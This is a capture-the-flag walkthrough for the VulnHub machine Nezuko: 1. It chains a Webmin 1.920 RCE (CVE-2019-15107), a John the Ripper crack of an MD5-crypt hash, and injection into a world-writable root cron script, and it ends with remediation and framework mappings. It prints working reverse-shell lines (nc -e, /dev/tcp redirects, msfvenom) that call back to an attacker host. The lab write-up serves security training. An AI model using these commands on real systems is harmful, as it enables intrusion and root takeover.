# Nezuko: 1 — Demon Slayer's Server Has a CVE

Look at guys!! Who would have thought that a Demon Slayer-themed CTF would hit you with a Webmin RCE on a non-standard port and then gate the root path behind a writable cron script? Nezuko: 1 chains a public exploit (EDB-47293, CVE-2019-15107) into a hash crack into a cron abuse with a satisfying clean flow. The anime theme is just dressing: the techniques here are real and map directly to what you will encounter in real-world Linux server assessments. Nailed it, fr fr.

Shoutout to the creator for tying the escalation path to the Demon Slayer lore: two users, two demons to slay, one flag at the end. Aesthetic. gg.

---

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | Nezuko: 1 |
| **Attacker VM** | Kali Linux 2023.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/nezuko-1,352/ |
| **Techniques** | Nmap, Webmin 1.920 RCE (EDB-47293), reverse shell delivery, John the Ripper hash cracking, writable cron script abuse |
| **CVEs** | CVE-2019-15107 (Webmin 1.920 Unauthenticated RCE), CWE-732 (Incorrect Permission Assignment: world-writable cron script), CWE-916 (Use of Password Hash with Insufficient Computational Effort) |
| **APT Groups** | APT32 (OceanLotus): exploits internet-facing management interfaces including Webmin and similar admin panels for initial Linux server access; Lazarus Group: documented use of Webmin and similar Java-based web admin panels as entry points against technology and media targets |

---

## Attack Summary

```
netdiscover / nmap
    |
    v
nmap -p-: 22/tcp SSH + 80/tcp HTTP + 13337/tcp HTTPS (Webmin 1.920)
    |
    v
searchsploit webmin 1.920 -> EDB-47293 (Unauthenticated RCE)
    |
    v
modify exploit for reverse shell -> nc listener port 1337
    |
    v
sh shell.sh https://192.168.1.105:13337 -> shell as nezuko
    |
    v
python3 pty stabilization
    |
    v
cat /etc/passwd -> zenitsu hash (MD5-crypt $1$...)
    |
    v
john hash.txt --wordlist=rockyou.txt -> zenitsu:meowmeow
    |
    v
su zenitsu -> ls ~/to_nezuko/ -> send_message_to_nezuko.sh (world-writable, runs as root via cron)
    |
    v
echo reverse shell payload >> send_message_to_nezuko.sh
    |
    v
nc listener port 1234 -> root shell after cron executes
    |
    v
cat /root/root.txt
```

---

## Methodology

1. Host discovery and full port scan (do not skip non-standard ports)
2. Webmin version fingerprinting
3. CVE-2019-15107 exploit modification and execution for shell as nezuko
4. Shell stabilization with Python PTY
5. /etc/passwd hash extraction and John the Ripper cracking for zenitsu
6. Lateral movement: su zenitsu
7. Cron script enumeration: identify world-writable root-owned cron script
8. Payload injection into cron script
9. Root shell after cron execution

---

## Step 1 — Host Discovery and Full Port Scan

```bash
netdiscover -r 192.168.1.0/24
# Note the target IP, e.g.: 192.168.1.105

nmap -p- -A 192.168.1.105
```

**Open ports:**

| Port | Service | Notes |
|---|---|---|
| 22 | SSH | OpenSSH |
| 80 | HTTP | Static page with Nezuko image |
| 13337 | HTTPS | Webmin 1.920 (MiniServ) |

The non-standard port 13337 (a leet-speak for "elite") is the key. Always scan all 65535 ports on CTF machines and in real engagements: service hiding on non-standard ports is common.

**Alternative scan:**

```bash
rustscan -a 192.168.1.105 -- -A -sV
```

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Webmin RCE Exploit (CVE-2019-15107 / EDB-47293)

Webmin 1.920 contains an unauthenticated remote code execution vulnerability (CVE-2019-15107) in the password reset functionality. The vulnerability allows an attacker to inject commands into the `old` parameter of `password_change.cgi` without authentication.

Search and retrieve the exploit:

```bash
searchsploit webmin 1.920
# Returns: Webmin 1.920 - Unauthenticated Remote Code Execution (EDB-47293)

searchsploit -m 47293
cp 47293.sh shell.sh
```

Modify the exploit payload to deliver a reverse shell:

```bash
# Edit the curl command in shell.sh to replace the check payload
# Change the cmd value to deliver a bash reverse shell:
# nc -e /bin/bash 192.168.1.106 1337
# OR:
# bash -i >& /dev/tcp/192.168.1.106/1337 0>&1
```

Start the listener on attacker:

```bash
nc -lvnp 1337
```

Execute the exploit:

```bash
sh shell.sh https://192.168.1.105:13337
```

A shell is received as user `nezuko`.

**Real-world note:** CVE-2019-15107 was actively exploited in the wild against internet-facing Webmin installations shortly after public disclosure in 2019. Webmin is commonly deployed on Linux servers for remote administration and many instances remain exposed to the internet with outdated versions. APT32 (OceanLotus) was observed scanning for exposed Webmin instances during their 2019-2020 Southeast Asia campaigns.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application

---

## Step 3 — Shell Stabilization

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash
# Ctrl+Z
stty raw -echo; fg
# Enter twice
```

Now you have a proper interactive shell. Tab completion, job control, Ctrl+C to cancel commands, everything works.

---

## Step 4 — Enumeration as nezuko

```bash
ls ~/
# from_zenitsu/  nezuko.txt

cat ~/nezuko.txt
# User flag

cat /etc/passwd
# Look for: zenitsu:$1$...(hash)...:1001:1001:...
```

The `/etc/passwd` file contains zenitsu's password hash in MD5-crypt format (identified by `$1$`). MD5-crypt was deprecated decades ago; modern systems should use SHA-512 ($6$) or bcrypt ($2b$).

**MITRE ATT&CK:** T1552.001 — Unsecured Credentials: Credentials in Files; T1003.008 — OS Credential Dumping: /etc/passwd and /etc/shadow

---

## Step 5 — Crack zenitsu's Password Hash

Extract the hash line from /etc/passwd:

```bash
# On attacker machine
grep zenitsu /etc/passwd  # (get the hash from the shell)
echo 'zenitsu:$1$<hash_value_here>' > /tmp/zenitsu_hash.txt
john /tmp/zenitsu_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john /tmp/zenitsu_hash.txt --show
```

Cracked credentials: `zenitsu:meowmeow`

The password `meowmeow` (a cat sound reference) is trivially crackable with rockyou.txt. MD5-crypt hashes are extremely fast to crack on modern hardware.

**MITRE ATT&CK:** T1110.002 — Brute Force: Password Cracking

---

## Step 6 — Lateral Movement: nezuko to zenitsu

```bash
su zenitsu
# Password: meowmeow

id
# uid=1001(zenitsu) gid=1001(zenitsu) groups=1001(zenitsu)

ls ~/to_nezuko/
# send_message_to_nezuko.sh
```

---

## Step 7 — Cron Script Privilege Escalation

Inspect the script permissions:

```bash
ls -la ~/to_nezuko/send_message_to_nezuko.sh
# -rwxrwxrwx 1 root root ... send_message_to_nezuko.sh
```

World-writable. Owned by root. This script is almost certainly executed by a root-owned cron job. Verify:

```bash
cat /etc/crontab
# OR:
crontab -l
# check for entries pointing to this script
```

The script runs as root every few minutes via cron. Since it is world-writable, any user can modify it. This is a direct root shell path.

Generate or craft a reverse shell payload:

```bash
msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.106 lport=1234 R
# OR: just use a bash TCP redirect directly
```

Inject the payload into the cron script:

```bash
echo '0<&60-;exec 60<>/dev/tcp/192.168.1.106/1234;sh <&60 >&60 2>&60' >> ~/to_nezuko/send_message_to_nezuko.sh
```

Start a listener and wait for cron:

```bash
nc -lvnp 1234
# Wait up to 5 minutes for the cron job to execute
```

After cron runs:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

(☞ﾟヮﾟ)☞ Root. The demons are slain.

**Real-world note:** World-writable cron scripts executed as root are a high-severity privilege escalation finding in enterprise Linux audits. This exact misconfiguration (cron job runs as root, script owned by root but writable by all) appears in multiple Red Team engagements and is documented as a common persistence mechanism used by threat actors to maintain root-level access after initial compromise.

**MITRE ATT&CK:** T1053.003 — Scheduled Task/Job: Cron; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| User flag | `nezuko.txt` | `/home/nezuko/nezuko.txt` | Reading file |
| Password hash | `$1$...(MD5-crypt)` | `/etc/passwd` zenitsu entry | John: meowmeow |
| Credential | `zenitsu:meowmeow` | /etc/passwd hash cracked | su zenitsu |
| Root flag | `root.txt` | `/root/root.txt` | Cron script injection |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Webmin 1.920 unauthenticated RCE (CVE-2019-15107) | Actively exploited in 2019-2020; APT32 scanned for exposed Webmin instances; publicly documented exploit | Update Webmin immediately to 1.930+; restrict to management VLAN; require MFA |
| 2 | MD5-crypt password hash in /etc/passwd (not shadow) | MD5-crypt is deprecated and trivially crackable; shadow passwords with SHA-512 are the minimum standard | Migrate all passwords to /etc/shadow with SHA-512 ($6$) and high rounds count |
| 3 | Weak password (meowmeow) | Simple dictionary words and leet substitutions are first-pass targets in any crack attempt | Enforce password complexity policy; use a password manager; reject common words |
| 4 | World-writable root-owned cron script | Critical privilege escalation finding in enterprise environments; maps directly to T1053.003 | Audit all cron scripts for write permissions: chmod 700 and chown root:root all cron scripts |
| 5 | Non-standard port (13337) hosting management interface | Security through obscurity provides minimal protection; real threat actors scan all ports | Firewall management interfaces to specific management hosts; do not rely on port obfuscation |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | OS Credential Dumping: /etc/passwd | T1003.008 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Lateral Movement | Lateral Movement | Use Alternate Authentication Material | T1550 |
| Privilege Escalation | Privilege Escalation | Scheduled Task/Job: Cron | T1053.003 |
| Execution | Execution | Scheduled Task/Job: Cron | T1053.003 |

---

## Remediation and Containment

### Technical Fixes

1. **Update Webmin immediately:** upgrade to 1.930 or later; CVE-2019-15107 is patched in 1.930+; enable IP access controls in Webmin configuration
2. **Migrate passwords to shadow with SHA-512:** run `pwconv` to move hashes from /etc/passwd to /etc/shadow; configure PAM to use SHA-512 (`ENCRYPT_METHOD SHA512` in /etc/login.defs)
3. **Fix cron script permissions:** `chmod 700 /home/zenitsu/to_nezuko/send_message_to_nezuko.sh; chown root:root /home/zenitsu/to_nezuko/send_message_to_nezuko.sh`
4. **Restrict Webmin to management VLAN:** configure firewall rules to allow Webmin access only from authorized management hosts
5. **Enforce password complexity:** implement PAM pam_cracklib or pam_pwquality with minimum length 12, complexity requirements, and rejection of dictionary words

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (Webmin IP restrictions; disable if not needed)
- **D3-OAM** — Operating System Administrative Management (cron script permissions; shadow password enforcement)
- **D3-PA** — Password Authentication (SHA-512 shadow passwords; password complexity enforcement)
- **D3-NTF** — Network Traffic Filtering (firewall Webmin to management hosts only)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all management interfaces (Webmin, cPanel, etc.); audit versions and patch status |
| Protect | Access Control | Restrict Webmin to management VLAN; require MFA for admin access |
| Protect | Data Security | Migrate to shadow passwords with SHA-512; enforce password complexity |
| Detect | Anomalies and Events | Alert on Webmin exploitation attempts; monitor cron script modifications |
| Respond | Response Planning | Patch Webmin; rotate all user passwords; audit cron scripts for unauthorized modifications |
| Recover | Recovery Planning | Rebuild from known-good image; rotate all credentials |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict Webmin access to management hosts |
| AC-6 | Least Privilege | Cron scripts: root-owned, root-writable only |
| CM-6 | Configuration Settings | Update Webmin; enforce shadow passwords |
| CM-7 | Least Functionality | Disable Webmin if not actively needed |
| IA-5 | Authenticator Management | SHA-512 shadow passwords; enforce complexity |
| SI-2 | Flaw Remediation | Patch Webmin CVE-2019-15107 immediately |

### CISA KEV

CVE-2019-15107 (Webmin Remote Code Execution) is relevant to CISA guidance on internet-facing management interface security. Organizations are advised to either update Webmin to patched versions or restrict access to management-only networks. Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT Asset Inventory | MIL2 |
| Identity and Access Management (IAM) | Manage Credentials | MIL3 |

---

## Final Thoughts

Nezuko: 1 is a clean, well-paced machine that teaches real techniques under an anime aesthetic. The CVE-2019-15107 exploitation, hash cracking, and cron abuse chain maps directly to documented real-world attack patterns. If you can work through this box end-to-end without hints, you have solid Linux server compromise fundamentals.

The Demon Slayer theme is just flavor, but it is good flavor: Nezuko and Zenitsu as sequential users, each guarding the path to the next step, is a creative structure. The creator clearly thought about the narrative.

Keep slaying, dude. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
